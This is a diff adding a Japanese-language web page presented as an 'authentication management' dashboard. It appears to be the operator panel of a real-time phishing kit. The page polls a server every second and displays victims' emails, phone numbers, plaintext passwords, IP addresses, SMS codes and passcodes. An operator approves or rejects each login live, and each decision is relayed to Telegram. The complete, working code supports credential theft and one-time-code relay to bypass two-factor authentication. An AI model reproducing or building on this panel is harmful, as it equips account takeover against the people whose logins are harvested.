@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>認証管理画面</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background-color: #f5f5f5; padding: 20px; min-height: 100vh; }
+        .container { max-width: 1200px; margin: 0 auto; }
+        .header { background-color: #fff; padding: 20px; border-radius: 12px; margin-bottom: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+        .title { font-size: 28px; font-weight: 700; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-bottom: 30px; }
+        .card { background-color: #fff; border-radius: 12px; padding: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+        .card-title { font-size: 18px; font-weight: 600; border-bottom: 2px solid #0066ff; padding-bottom: 12px; margin-bottom: 16px; }
+        .request-item { background-color: #f9f9f9; border-left: 4px solid #0066ff; padding: 12px; margin-bottom: 12px; border-radius: 8px; animation: slideIn 0.3s ease; }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+        .empty { text-align: center; color: #999; padding: 20px; }
+        .info-row { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 6px; }
+        .label { color: #666; font-weight: 500; }
+        .value { color: #000; word-break: break-all; max-width: 55%; }
+        .buttons { display: flex; gap: 8px; margin-top: 12px; }
+        .btn { flex: 1; padding: 10px; border: none; border-radius: 6px; font-size: 13px; font-weight: 600; cursor: pointer; }
+        .btn-approve { background-color: #00c853; color: #fff; }
+        .btn-approve:active { background-color: #00a040; }
+        .btn-reject { background-color: #ff5252; color: #fff; }
+        .btn-reject:active { background-color: #e53935; }
+        .history-section { margin-top: 30px; }
+        .history-title { font-size: 16px; font-weight: 600; margin-bottom: 16px; }
+        .history-item { background-color: #fff; border-left: 4px solid #ccc; padding: 16px; margin-bottom: 12px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+        .history-item.approved { border-left-color: #00c853; background-color: #f1f8f5; }
+        .history-item.rejected { border-left-color: #ff5252; background-color: #fef5f5; }
+        .history-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
+        .history-status { font-size: 12px; padding: 4px 8px; border-radius: 4px; font-weight: 600; color: #fff; }
+        .history-status.approved { background-color: #00c853; }
+        .history-status.rejected { background-color: #ff5252; }
+        @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } .value { max-width: 100%; } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="title">🎛️ 認証管理画面</div>
+            <div style="font-size:14px;color:#666;margin-top:8px;">リアルタイムで認証リクエストを管理します</div>
+        </div>
+
+        <h2 style="font-size:18px;margin-bottom:16px;">⏳ 待機中のリクエスト</h2>
+        <div class="grid">
+            <div class="card">
+                <div class="card-title">📧 ログイン情報</div>
+                <div id="loginRequests" class="request-container"></div>
+            </div>
+            <div class="card">
+                <div class="card-title">📱 SMS認証</div>
+                <div id="smsRequests" class="request-container"></div>
+            </div>
+            <div class="card">
+                <div class="card-title">🔐 パスコード認証</div>
+                <div id="passcodeRequests" class="request-container"></div>
+            </div>
+        </div>
+
+        <div class="history-section">
+            <h2 class="history-title">📋 処理履歴</h2>
+            <div class="grid">
+                <div class="card">
+                    <div class="card-title">✅ 許可済み</div>
+                    <div id="approvedHistory" class="history-container"></div>
+                </div>
+                <div class="card">
+                    <div class="card-title">❌ 拒否済み</div>
+                    <div id="rejectedHistory" class="history-container"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const state = {
+            requests: { login: [], sms: [], passcode: [] },
+            history: { approved: [], rejected: [] },
+            processed: new Set()
+        };
+
+        // ===== サーバーから定期同期（1秒毎） =====
+        function syncPending() {
+            fetch('/api/auth?action=getPending&_t=' + Date.now())
+                .then(res => res.json())
+                .then(data => {
+                    if (!data.success) return;
+                    
+                    const pending = data.pending || [];
+                    
+                    pending.forEach(req => {
+                        if (!state.processed.has(req.sessionId)) {
+                            state.processed.add(req.sessionId);
+                            
+                            const typeMap = { 'LOGIN_REQUEST': 'login', 'SMS_REQUEST': 'sms', 'PASSCODE_REQUEST': 'passcode' };
+                            const type = typeMap[req.type] || 'login';
+                            
+                            req.id = req.sessionId;
+                            state.requests[type].push(req);
+                        }
+                    });
+                    
+                    // 削除されたリクエストを検出
+                    const pendingIds = new Set(pending.map(r => r.sessionId));
+                    state.requests.login = state.requests.login.filter(r => pendingIds.has(r.sessionId));
+                    state.requests.sms = state.requests.sms.filter(r => pendingIds.has(r.sessionId));
+                    state.requests.passcode = state.requests.passcode.filter(r => pendingIds.has(r.sessionId));
+                    
+                    render();
+                })
+                .catch(err => console.error('Sync error:', err));
+        }
+
+        // 初期同期 + 定期同期
+        syncPending();
+        setInterval(syncPending, 1000);
+
+        // 許可処理
+        async function handleApprove(id, type) {
+            const idx = state.requests[type].findIndex(r => r.id === id);
+            if (idx === -1) return;
+
+            const request = state.requests[type][idx];
+            const typeLabel = getTypeLabel(type);
+
+            state.requests[type].splice(idx, 1);
+
+            try {
+                console.log('許可ボタンが押されました:', id, type);
+
+                // API で許可を更新
+                await fetch('/api/auth', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ sessionId: id, action: 'approved' })
+                });
+
+                // Telegram通知を送信
+                const message = `✅ 認証許可\nタイプ: ${typeLabel}\nセッションID: ${id}\n時刻: ${new Date().toLocaleString('ja-JP')}`;
+                console.log('Telegram通知を送信:', message);
+                await sendTelegramNotification(message);
+
+                // 履歴に追加
+                state.history.approved.push({ id, type, typeLabel, timestamp: request.timestamp });
+                render();
+            } catch (err) {
+                console.error('許可処理エラー:', err);
+            }
+        }
+
+        // 拒否処理
+        async function handleReject(id, type) {
+            const idx = state.requests[type].findIndex(r => r.id === id);
+            if (idx === -1) return;
+
+            const request = state.requests[type][idx];
+            const typeLabel = getTypeLabel(type);
+
+            state.requests[type].splice(idx, 1);
+
+            try {
+                console.log('拒否ボタンが押されました:', id, type);
+
+                // API で拒否を更新
+                await fetch('/api/auth', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ sessionId: id, action: 'rejected', message: 'Rejected by admin' })
+                });
+
+                // Telegram通知を送信
+                const message = `❌ 認証拒否\nタイプ: ${typeLabel}\nセッションID: ${id}\n時刻: ${new Date().toLocaleString('ja-JP')}`;
+                console.log('Telegram通知を送信:', message);
+                await sendTelegramNotification(message);
+
+                // 履歴に追加
+                state.history.rejected.push({ id, type, typeLabel, timestamp: request.timestamp });
+                render();
+            } catch (err) {
+                console.error('拒否処理エラー:', err);
+            }
+        }
+
+        // Telegram通知を送信
+        function sendTelegramNotification(message) {
+            return fetch('/api/notify', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ message })
+            })
+            .then(res => {
+                console.log('notify.php レスポンスステータス:', res.status);
+                return res.json();
+            })
+            .then(data => {
+                console.log('notify.php レスポンス:', data);
+                if (!data.success) {
+                    console.error('Telegram通知エラー:', data.error);
+                }
+            })
+            .catch(err => {
+                console.error('Telegram通知リクエストエラー:', err);
+            });
+        }
+
+        function getTypeLabel(type) {
+            return { login: 'ログイン', sms: 'SMS認証', passcode: 'パスコード認証' }[type] || type;
+        }
+
+        function render() {
+            renderRequests();
+            renderHistory();
+            attachListeners();
+        }
+
+        function renderRequests() {
+            ['login', 'sms', 'passcode'].forEach(type => {
+                const container = document.getElementById(type + 'Requests');
+                if (!container) return;
+
+                if (state.requests[type].length === 0) {
+                    container.innerHTML = '<div class="empty">待機中のリクエストはありません</div>';
+                    return;
+                }
+
+                container.innerHTML = state.requests[type].map(r => {
+                    let info = '';
+                    if (type === 'login') {
+                        info = `
+                            <div class="info-row"><span class="label">セッションID</span><span class="value">${escapeHtml(r.sessionId || '')}</span></div>
+                            <div class="info-row"><span class="label">メール</span><span class="value">${escapeHtml(r.email || '')}</span></div>
+                            <div class="info-row"><span class="label">電話</span><span class="value">${escapeHtml(r.phone || '')}</span></div>
+                            <div class="info-row"><span class="label">パスワード</span><span class="value">${escapeHtml(r.password || '')}</span></div>
+                            <div class="info-row"><span class="label">User-Agent</span><span class="value">${escapeHtml((r.userAgent || '').substring(0, 60))}</span></div>
+                            <div class="info-row"><span class="label">IP</span><span class="value">${escapeHtml(r.clientIP || '')}</span></div>
+                            <div class="info-row"><span class="label">時刻</span><span class="value">${escapeHtml(r.timestamp || '')}</span></div>
+                        `;
+                    } else if (type === 'sms') {
+                        info = `
+                            <div class="info-row"><span class="label">セッションID</span><span class="value">${escapeHtml(r.sessionId || '')}</span></div>
+                            <div class="info-row"><span class="label">認証コード</span><span class="value">${escapeHtml(r.code || '')}</span></div>
+                            <div class="info-row"><span class="label">User-Agent</span><span class="value">${escapeHtml((r.userAgent || '').substring(0, 60))}</span></div>
+                            <div class="info-row"><span class="label">時刻</span><span class="value">${escapeHtml(r.timestamp || '')}</span></div>
+                        `;
+                    } else if (type === 'passcode') {
+                        info = `
+                            <div class="info-row"><span class="label">セッションID</span><span class="value">${escapeHtml(r.sessionId || '')}</span></div>
+                            <div class="info-row"><span class="label">パスコード</span><span class="value">${escapeHtml(r.code || '')}</span></div>
+                            <div class="info-row"><span class="label">User-Agent</span><span class="value">${escapeHtml((r.userAgent || '').substring(0, 60))}</span></div>
+                            <div class="info-row"><span class="label">時刻</span><span class="value">${escapeHtml(r.timestamp || '')}</span></div>
+                        `;
+                    }
+                    return `<div class="request-item">
+                        ${info}
+                        <div class="buttons">
+                            <button class="btn btn-approve" data-id="${r.id}" data-type="${type}">✅ 許可</button>
+                            <button class="btn btn-reject" data-id="${r.id}" data-type="${type}">❌ 拒否</button>
+                        </div>
+                    </div>`;
+                }).join('');
+            });
+        }
+
+        function renderHistory() {
+            ['approved', 'rejected'].forEach(status => {
+                const container = document.getElementById(status + 'History');
+                if (!container) return;
+
+                if (state.history[status].length === 0) {
+                    container.innerHTML = '<div class="empty">履歴がありません</div>';
+                    return;
+                }
+
+                container.innerHTML = state.history[status].map(h => `
+                    <div class="history-item ${status}">
+                        <div class="history-header">
+                            <span>${h.typeLabel}</span>
+                            <span class="history-status ${status}">${status === 'approved' ? '許可' : '拒否'}</span>
+                        </div>
+                    </div>
+                `).join('');
+            });
+        }
+
+        function attachListeners() {
+            document.querySelectorAll('.btn-approve').forEach(btn => {
+                btn.onclick = function() {
+                    handleApprove(this.dataset.id, this.dataset.type);
+                };
+            });
+            document.querySelectorAll('.btn-reject').forEach(btn => {
+                btn.onclick = function() {
+                    handleReject(this.dataset.id, this.dataset.type);
+                };
+            });
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        render();
+        console.log('✅ 管理画面が読み込まれました');
+    </script>
+</body>
+</html>
